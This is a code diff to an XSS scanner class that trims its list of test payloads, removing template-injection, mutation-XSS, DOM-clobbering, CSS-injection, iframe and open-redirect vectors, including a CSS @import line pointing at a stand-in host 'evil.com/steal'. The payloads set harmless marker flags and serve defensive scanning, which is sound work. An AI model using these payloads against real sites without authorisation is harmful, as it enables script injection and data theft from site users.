@@ -14,7 +14,6 @@ export class XSSScanner {
 
     // XSS test payloads — designed for detection, not exploitation
     static PAYLOADS = [
-        // ── Classic Vectors ──
         { name: 'Basic script tag', payload: '<script>window.__JAKU_XSS_1=1</script>', marker: '__JAKU_XSS_1' },
         { name: 'IMG onerror', payload: '<img src=x onerror="window.__JAKU_XSS_2=1">', marker: '__JAKU_XSS_2' },
         { name: 'SVG onload', payload: '<svg onload="window.__JAKU_XSS_3=1">', marker: '__JAKU_XSS_3' },
@@ -24,36 +23,7 @@ export class XSSScanner {
         { name: 'Single quote break', payload: "' onmouseover='window.__JAKU_XSS_5=1", marker: '__JAKU_XSS_5' },
         { name: 'Double quote break', payload: '" onmouseover="window.__JAKU_XSS_6=1', marker: '__JAKU_XSS_6' },
         { name: 'JavaScript URL', payload: 'javascript:window.__JAKU_XSS_7=1', marker: '__JAKU_XSS_7' },
-
-        // ── Framework Template Injection ──
-        { name: 'AngularJS template injection', payload: '{{7*7}}', marker: '49' },
-        { name: 'AngularJS constructor XSS', payload: '{{constructor.constructor("window.__JAKU_NG=1")()}}', marker: '__JAKU_NG' },
-        { name: 'Vue.js template injection', payload: '{{$emit("jaku")}}', marker: '$emit' },
-        { name: 'Vue constructor XSS', payload: '{{constructor.constructor(\'window.__JAKU_VUE=1\')()}}', marker: '__JAKU_VUE' },
-
-        // ── Mutation XSS (mXSS) ──
-        { name: 'mXSS — noscript tag', payload: '<noscript><p title="</noscript><img src=x onerror=window.__JAKU_MXSS=1>">', marker: '__JAKU_MXSS' },
-        { name: 'mXSS — table context', payload: '<table><td><title><</title><img src=x onerror=window.__JAKU_MXSS2=1>', marker: '__JAKU_MXSS2' },
-
-        // ── DOM Clobbering ──
-        { name: 'DOM clobber — id=location', payload: '<form id=location></form>', marker: 'id=location' },
-        { name: 'DOM clobber — window.name', payload: `<iframe name="__JAKU_DOM_CLOB"></iframe>`, marker: '__JAKU_DOM_CLOB' },
-
-        // ── CSS Injection ──
-        { name: 'CSS expression injection', payload: `<div style="background:url('javascript:window.__JAKU_CSS=1')">`, marker: '__JAKU_CSS' },
-        { name: 'CSS @import exfil', payload: `<style>@import 'https://evil.com/steal?x=1';</style>`, marker: 'evil.com' },
-
-        // ── Alternative Execution Contexts ──
-        { name: 'SVG foreignObject', payload: '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>window.__JAKU_SVG_FO=1</script></body></foreignObject></svg>', marker: '__JAKU_SVG_FO' },
-        { name: 'Data URI in iframe', payload: '<iframe src="data:text/html,<script>window.parent.__JAKU_DATA=1</script>"></iframe>', marker: '__JAKU_DATA' },
-        { name: 'iframe srcdoc XSS', payload: '<iframe srcdoc="<script>window.parent.__JAKU_SRCDOC=1</script>"></iframe>', marker: '__JAKU_SRCDOC' },
-
-        // ── Open Redirect (separate from XSS but tested via same param surface) ──
-        { name: 'Open redirect — absolute', payload: 'https://evil.attacker.com', marker: 'evil.attacker.com', type: 'redirect' },
-        { name: 'Open redirect — protocol', payload: '//evil.attacker.com', marker: 'evil.attacker.com', type: 'redirect' },
-        { name: 'Open redirect — backslash', payload: '/\\evil.attacker.com', marker: 'evil.attacker.com', type: 'redirect' },
     ];
-
 
     /**
      * Run XSS scanning on all discovered surfaces.
